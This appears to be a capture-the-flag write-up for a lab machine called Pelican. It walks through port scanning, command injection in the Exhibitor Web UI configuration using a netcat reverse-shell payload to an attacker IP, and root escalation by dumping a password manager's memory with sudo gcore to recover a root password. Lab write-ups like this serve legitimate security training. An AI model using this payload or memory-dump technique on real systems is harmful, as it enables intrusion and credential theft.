# Pelican

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.219.98 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:56 +08
Nmap scan report for 192.168.219.98
Host is up (0.17s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
41665/tcp open  unknown
```

Ran a detailed `nmap` scan as well:

```
$ sudo nmap -p 22,139,445,631,2181,222,8080,8081 -sC -sV --min-rate 4000 192.168.219.98
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 10:57 +08
Nmap scan report for 192.168.219.98
Host is up (0.17s latency).

PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
222/tcp  closed rsh-spx
445/tcp  open   netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp open   zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
8080/tcp open   http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp open   http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.219.98:8080/exhibitor/v1/ui/index.html
```

There's a ZooKeeper software, but there aren't any exploits for it. Port 8081 had an Exhibitor software being used, and there are RCE exploits for this:

```
$ searchsploit exhibitor
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Exhibitor Web UI 1.7.1 - Remote Code Execution             | java/webapps/48654.txt
----------------------------------------------------------- ---------------------------------
```

### Exhibitor RCE

The Exhibitor RCE is rather simple, and the Config tab looks rather vulnerable.&#x20;

<figure><img src="../../../.gitbook/assets/image (1803).png" alt=""><figcaption></figcaption></figure>

The `java.env` script part seems to be running `bash`. I downloaded the exploit found from `searchsploit`, and attempted their POC:

```
$(nc -e /bin/bash 192.168.45.182 4444)
```

<figure><img src="../../../.gitbook/assets/image (1343).png" alt=""><figcaption></figcaption></figure>

Afterwards, committing the changes would give us a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3318).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Gcore --> Root Creds

The current user has some `sudo` privileges:

```
charles@pelican:/opt/zookeeper$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

`gcore` is a program that is used to create core dumps of running processes, and since we can use `sudo` with it, we essentially can create these dumps of any processes. As such, let's enumerate what `root` is running:

```
charles@pelican:/opt/zookeeper$ ps -ef | grep root
<TRUNCATED>
root       510   459  0 22:53 ?        00:00:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
avahi      522   456  0 22:53 ?        00:00:00 avahi-daemon: chroot helper
root       527     1  0 22:53 ?        00:00:00 /usr/bin/password-store
<TRUNCATED>
```

There's a `password-store` binary being run, which is essentially a password manager. We can create a core dump for this process:

```
charles@pelican:/opt/zookeeper$ sudo /usr/bin/gcore 527
0x00007f31c88806f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7fffe1091db0, remaining=remaining@entry=0x7fffe1091db0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.527
```

We can then use `strings` on the core dump file to find a password:

```
charles@pelican:/opt/zookeeper$ strings core.527
<TRUNCATED>
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
<TRUNCATED>
```

Using this password, we can `su` to `root`:

<figure><img src="../../../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>
